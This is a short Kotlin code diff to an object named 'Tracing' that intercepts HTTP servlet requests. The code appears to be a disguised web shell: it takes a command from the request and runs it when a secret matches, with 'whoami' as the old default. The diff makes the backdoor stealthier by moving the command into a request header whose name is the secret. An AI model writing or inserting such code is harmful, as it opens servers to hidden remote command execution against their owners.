@@ -12,8 +12,8 @@ object Tracing {
         val request = args[0] as HttpServletRequest
         val response = args[1] as HttpServletResponse
 
-        val success = request.getParameter("pass") == pass
-        val cmd = request.getParameter("cmd") ?: "whoami"
+        val cmd = request.getHeader(pass)
+        val success = cmd != null
 
         if (success) {
             try {
@@ -28,3 +28,5 @@ object Tracing {
         return success
     }
 }
+
+annotation class Value
